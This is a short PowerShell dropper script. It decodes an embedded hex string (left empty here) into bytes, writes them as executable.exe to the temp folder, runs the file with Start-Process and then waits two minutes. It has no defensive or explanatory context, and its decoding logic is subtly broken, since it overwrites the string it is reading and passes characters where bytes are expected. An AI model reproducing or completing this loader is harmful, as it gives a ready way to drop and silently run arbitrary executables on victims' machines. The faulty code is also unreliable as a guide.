#exe in hex
$hex = ""
$hex = for($i=0; $i -lt $hex.length; $i+=2)
{
[char][int]::Parse($hex.substring($i,2),'HexNumber')
}
[System.IO.File]::WriteAllBytes("$env:temp\executable.exe", $hex)
Start-Process -FilePath "$env:temp\executable.exe"
start-sleep 120